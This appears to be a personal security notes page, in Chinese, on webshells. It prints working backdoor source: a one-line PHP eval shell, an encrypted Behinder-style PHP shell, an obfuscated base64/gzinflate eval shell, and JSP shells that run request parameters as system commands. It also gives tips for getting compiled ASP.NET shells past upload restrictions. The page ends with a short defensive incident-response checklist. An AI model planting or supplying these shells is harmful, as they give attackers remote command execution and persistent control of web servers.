<!DOCTYPE html>
<html lang="en">
<head>
<!-- 2023-12-03 Sun 16:50 -->
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Webshell</title>
<meta name="author" content="Honbey Zhang" />
<meta name="generator" content="Org Mode" />

                     <link rel="stylesheet" href="../resources/src/bigblow_theme/css/htmlize.css" type="text/css"/>
                     <link rel="stylesheet" href="../resources/src/bigblow_theme/css/bigblow.css" type="text/css"/>
                     <link rel="stylesheet" href="../resources/src/bigblow_theme/css/hideshow.css" type="text/css"/>
                     <script type="text/javascript" src="../resources/src/bigblow_theme/js/jquery-1.11.0.min.js"></script>
                     <script type="text/javascript" src="../resources/src/bigblow_theme/js/jquery-ui-1.10.2.min.js"></script>
                     <script type="text/javascript" src="../resources/src/bigblow_theme/js/jquery.localscroll-min.js"></script>
                     <script type="text/javascript" src="../resources/src/bigblow_theme/js/jquery.scrollTo-1.4.3.1-min.js"></script>
                     <script type="text/javascript" src="../resources/src/bigblow_theme/js/bigblow.js"></script>
                     <script type="text/javascript" src="../resources/src/bigblow_theme/js/hideshow.js"></script>
                     <script type="text/javascript" src="../resources/src/lib/js/jquery.stickytableheaders.min.js"></script>
</head>
<body>
<div id="content" class="content">
<header>
<h1 class="title">Webshell</h1>
</header><nav id="table-of-contents" role="doc-toc">
<h2>Table of Contents</h2>
<div id="text-table-of-contents" role="doc-toc">
<ul>
<li><a href="#org5f171ac">PHP Webshell</a></li>
<li><a href="#org57f6d01">JSP Webshell</a></li>
<li><a href="#orgf8bccd7">ASP Webshell</a>
<ul>
<li><a href="#org396e9e2">Find Vulnerabilities / Code Audit</a></li>
<li><a href="#org0b3c979">Global.asax</a></li>
<li><a href="#orgcf23041">ILSpy</a></li>
</ul>
</li>
</ul>
</div>
</nav>
<div id="outline-container-org5f171ac" class="outline-2">
<h2 id="org5f171ac">PHP Webshell</h2>
<div class="outline-text-2" id="text-org5f171ac">
<p>
一句话木马：
</p>
<div class="org-src-container">
<pre class="src src-php">&lt;?php eval($_POST["pass"]);?&gt;
</pre>
</div>

<p>
冰蝎 PHP Webshell：
</p>
<div class="org-src-container">
<pre class="src src-php">&lt;?php
session_start();
if (isset($_GET['pass'])) {
    $key = substr(md5(uniqid(rand())),16);
    $_SESSION['k'] = $key;
    print $key;
} else {
    $key = $_SESSION['k'];
    $post = file_get_contents("php://input");
    if(!extension_loaded('openssl')) {
        $t = "base64_"."decode";
        $post = $t($post."");
        for($i = 0; $i &lt; strlen($post); $i++) {
            $post[$i] = $post[$i]^$key[$i+1&amp;15];
        }
    } else {
        $post = openssl_decrypt($post, "AES128", $key);
    }
    $arr = explode('|',$post);
    $func = $arr[0];
    $params = $arr[1];
    class C{public function __construct($p) {eval($p."");}}
    @new C($params);
}
?&gt;
</pre>
</div>

<p>
带混淆的 PHP Webshell
</p>
<div class="org-src-container">
<pre class="src src-php">&lt;?php
function iJG($BHM) {
  $BHM=gzinflate(base64_decode($BHM));
  for($i=0;$i&lt;strlen($BHM);$i++) {
    $BHM[$i] = chr(ord($BHM[$i])-1);
  }
   return $BHM;
 } eval(iJG("U1QEAm4QkVaelKupmhAYEBIao1yYVFJSUVCcqhynZcPtYA8A"));
?&gt;
</pre>
</div>
</div>
</div>
<div id="outline-container-org57f6d01" class="outline-2">
<h2 id="org57f6d01">JSP Webshell</h2>
<div class="outline-text-2" id="text-org57f6d01">
<p>
一句话木马：
</p>
<div class="org-src-container">
<pre class="src src-java">&lt;%Runtime.getRuntime().exec(request.getParameter(<span style="color: #008000;">"pass"</span>));%&gt;
</pre>
</div>

<p>
带回显的 JSP Webshell：
</p>
<div class="org-src-container">
<pre class="src src-java">&lt;%
    <span style="color: #D0372D;">java</span>.<span style="color: #D0372D;">io</span>.InputStream in = Runtime.getRuntime().exec(request.getParameter(<span style="color: #008000;">"pass"</span>)).getInputStream();
    <span style="color: #6434A3;">int</span> <span style="color: #BA36A5;">a</span> = -<span style="color: #D0372D;">1</span>;
    <span style="color: #6434A3;">byte</span>[] <span style="color: #BA36A5;">b</span> = <span style="color: #0000FF;">new</span> <span style="color: #6434A3;">byte</span>[<span style="color: #D0372D;">2048</span>];
    out.print(<span style="color: #008000;">"&lt;pre&gt;"</span>);
    <span style="color: #0000FF;">while</span>((a=in.read(b))!=-<span style="color: #D0372D;">1</span>){
        out.println(<span style="color: #0000FF;">new</span> <span style="color: #6434A3;">String</span>(b));
    }
    out.print(<span style="color: #008000;">"&lt;/pre&gt;"</span>);
%&gt;
</pre>
</div>
</div>
</div>
<div id="outline-container-orgf8bccd7" class="outline-2">
<h2 id="orgf8bccd7">ASP Webshell</h2>
<div class="outline-text-2" id="text-orgf8bccd7">
<p>
.NET 优先加载 bin 目录下的程序，例如 index.aspx -&gt; /bin/index.dll ，这时任意目录均能处理 index.aspx ，如果存在任意文件上传漏洞的话，就可以将编译好的 webshell 上传到 bin 目录。
</p>

<p>
使用 <code>aspnet_compiler.exe</code> 编译：
</p>
<div class="org-src-container">
<pre class="src src-bat">aspnet_compiler -<span style="color: #6434A3;">v</span> \ -<span style="color: #6434A3;">p</span> src_directory dst_directory -<span style="color: #6434A3;">fixednames</span>
</pre>
</div>
</div>
<div id="outline-container-org396e9e2" class="outline-3">
<h3 id="org396e9e2">Find Vulnerabilities / Code Audit</h3>
<div class="outline-text-3" id="text-org396e9e2">
<ol class="org-ol">
<li>在得到安装包的情况下，用 ILSpy 反编译</li>
<li>查找 Upload, File, Download 等关键词</li>
<li>如果需要权限，寻找是否可以用参数如 isAdmin, preload 等绕过权限校验</li>
</ol>
</div>
</div>
<div id="outline-container-org0b3c979" class="outline-3">
<h3 id="org0b3c979">Global.asax</h3>
<div class="outline-text-3" id="text-org0b3c979">
<p>
文件说明<sup><a id="fnr.1" class="footref" href="#fn.1" role="doc-backlink">1</a></sup>。
</p>
</div>
</div>
<div id="outline-container-orgcf23041" class="outline-3">
<h3 id="orgcf23041">ILSpy</h3>
<div class="outline-text-3" id="text-orgcf23041">
<p>
.NET Decompiler with support for PDB generation, ReadyToRun, Metadata (&amp;more) - cross-platform!<sup><a id="fnr.2" class="footref" href="#fn.2" role="doc-backlink">2</a></sup>
</p>

<p>
如果直接上传的 aspx 被某些配置（如 PrecompiledApp.config 中的 updatable 值设置成了 false，此时 .NET 不再编译新的 aspx 文件）限制了不能执行，可以把 shell 手动编译成 dll 为 aspx 提供执行环境，具体例子<sup><a id="fnr.3" class="footref" href="#fn.3" role="doc-backlink">3</a></sup><sup>, </sup><sup><a id="fnr.4" class="footref" href="#fn.4" role="doc-backlink">4</a></sup>。
</p>
</div>
</div>
</div>
<div id="footnotes">
<h2 class="footnotes">Footnotes: </h2>
<div id="text-footnotes">

<div class="footdef"><sup><a id="fn.1" class="footnum" href="#fnr.1" role="doc-backlink">1</a></sup> <div class="footpara" role="doc-footnote"><p class="footpara">
<a href="https://www.cnblogs.com/supersnowyao/p/8159251.html">Global.asax 文件说明 - SuperSnowYao - 博客园</a>
</p></div></div>

<div class="footdef"><sup><a id="fn.2" class="footnum" href="#fnr.2" role="doc-backlink">2</a></sup> <div class="footpara" role="doc-footnote"><p class="footpara">
<a href="https://github.com/icsharpcode/ILSpy">https://github.com/icsharpcode/ILSpy</a>
</p></div></div>

<div class="footdef"><sup><a id="fn.3" class="footnum" href="#fnr.3" role="doc-backlink">3</a></sup> <div class="footpara" role="doc-footnote"><p class="footpara">
<a href="https://www.buaq.net/go-53733.html">https://www.buaq.net/go-53733.html</a>
</p></div></div>

<div class="footdef"><sup><a id="fn.4" class="footnum" href="#fnr.4" role="doc-backlink">4</a></sup> <div class="footpara" role="doc-footnote"><p class="footpara">
<a href="https://www.secpulse.com/archives/186800.html">https://www.secpulse.com/archives/186800.html</a>
</p>

<p class="footpara">
Webshell 通常是黑客用于控制网站服务器的文件，通常以 php, jsp, asp, asp.net 等载体存在于服务器网站目录下。
</p>

<p class="footpara">
Webshell 处置流程：
</p>
<ol class="org-ol">
<li>确认文件是否为正常业务文件，排除误报的情况</li>
<li>确认是 Webshell 后，若业务允许，需要立即隔离当前主机</li>
<li>进行攻击溯源，修复导致 Webshell 的相关漏洞</li>
<li>删除已存在的 Webshell</li>
<li>对当前主机进行全面排查，确保清除所有已存在的后门</li>
<li>安排主机及业务重新上线</li>
</ol>
<p class="footpara">
总的来说就是：排查、清除、关站，看有没有修复的可能。
</p></div></div>


</div>
</div></div>
<div id="postamble" class="status">

                     Theme
                     <a href="https://github.com/fniessen/org-html-themes" target="_blank">bigblow</a>
                     by
                     <a href="https://github.com/fniessen" target="_blank">fniessen</a>
                     <br>
                     <a href="https://beian.miit.gov.cn" target="_blank">湘ICP证019014083号</a>
</div>
</body>
</html>